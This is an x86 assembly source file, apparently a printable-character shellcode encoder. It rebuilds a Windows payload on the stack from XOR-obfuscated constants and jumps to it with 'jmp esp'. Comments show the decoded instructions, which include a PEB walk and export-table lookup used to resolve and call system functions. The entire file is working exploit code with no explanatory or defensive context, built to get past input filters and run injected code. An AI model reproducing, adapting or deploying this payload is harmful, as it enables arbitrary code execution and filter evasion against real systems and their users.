section .text

global _start
_start:
    pushad
register:
    push 0x21
    pop eax
    xor al , 0x21
    push eax
    pop ebx
    dec ebx
    push esp
    pop ecx
encode:
; push 0x9090585a
    push 0x473f6639
    pop eax
    xor eax, 0x28503e63
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x585ac361
    push 0x6e605b40
    pop eax
    xor eax, 0x363a6721
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0xe18b9d61
    push ebx
    pop eax
    xor eax, 0x5e345327
    xor eax, 0x40403146
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xd2ff500a
    push 0x716c7e65
    pop eax
    xor eax, 0x5c6c2e6f
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x6ae08921
    push 0x4e2d376c
    pop eax
    xor eax, 0x2432414d
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x577e426e
    pop eax
    xor eax, 0x765f634a
    push eax
; push 0x2c81848d
    push ebx
    pop eax
    xor eax, 0x5c245851
    xor eax, 0x705a2323
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x82846821
    push 0x385a2568
    pop eax
    xor eax, 0x45214d49
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x72467241
    pop eax
    xor eax, 0x53675365
    push eax
; push 0x2c812121
    push 0x71505c40
    pop eax
    xor eax, 0x5d2e7d61
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x212168da
    push 0x4c423778
    pop eax
    xor eax, 0x6d635f5d
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x0188148b
    push 0x76346240
    pop eax
    xor eax, 0x77437634
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x4a0c8b66
    push 0x2f325845
    pop eax
    xor eax, 0x653e2c23
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x585ae075
    push 0x382e6941
    pop eax
    xor eax, 0x60747634
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x3c3e6889
    push 0x4d6b275f
    pop eax
    xor eax, 0x71554f29
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xfa81f4eb
    push ebx
    pop eax
    xor eax, 0x3a282859
    xor eax, 0x3f56234d
    push eax
; push 0xc20111ca
    push 0x7a747961
    pop eax
    xor eax, 0x47756854
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0xc10774c0
    push 0x5d655a4a
    pop eax
    xor eax, 0x63622e75
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x84acd231
    push ebx
    pop eax
    xor eax, 0x4560695f
    xor eax, 0x3e33446e
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xc031de01
    push 0x6e626928
    pop eax
    xor eax, 0x51534829
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x8f348b49
    push 0x3c6a2b66
    pop eax
    xor eax, 0x4c5e5f2f
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x4be352da
    push 0x78413d5e
    pop eax
    xor eax, 0x335d6f7b
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x0124528b
    push 0x26692f3a
    pop eax
    xor eax, 0x274d7d4e
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdf01207a
    push 0x5b4b7031
    pop eax
    xor eax, 0x7b4a504b
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x8b50d801
    push 0x21395f6c
    pop eax
    xor eax, 0x5569786d
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x1c428b14
    push 0x4d7c2c2b
    pop eax
    xor eax, 0x513e583f
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x4a8bda01
    push 0x2f2c5040
    pop eax
    xor eax, 0x65587541
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x781a548b
    push 0x516a3148
    pop eax
    xor eax, 0x2970653c
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c538b10
    push 0x76352538
    pop eax
    xor eax, 0x4a665128
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0x5b8b1b8b
    push 0x2d395c47
    pop eax
    xor eax, 0x764d4733
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; push 0x1b8b145b
    push 0x283c7268
    pop eax
    xor eax, 0x33486633
    push eax
    push esp
    pop edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x8b0c5b8b
    push 0x5d7c333b
    pop eax
    xor eax, 0x2970684f
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    inc edx
    inc edx
    xor [edx], bh
; push 0x305b8b64
    push 0x5662323d
    pop eax
    xor eax, 0x66394659
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
; push 0xdb319c60
    push 0x5642384f
    pop eax
    xor eax, 0x72735b2f
    push eax
    push esp
    pop edx
    inc edx
    xor [edx], bh
    inc edx
    inc edx
    xor [edx], bh
; jmp to shellcode
to_shellcode:
    jmp esp
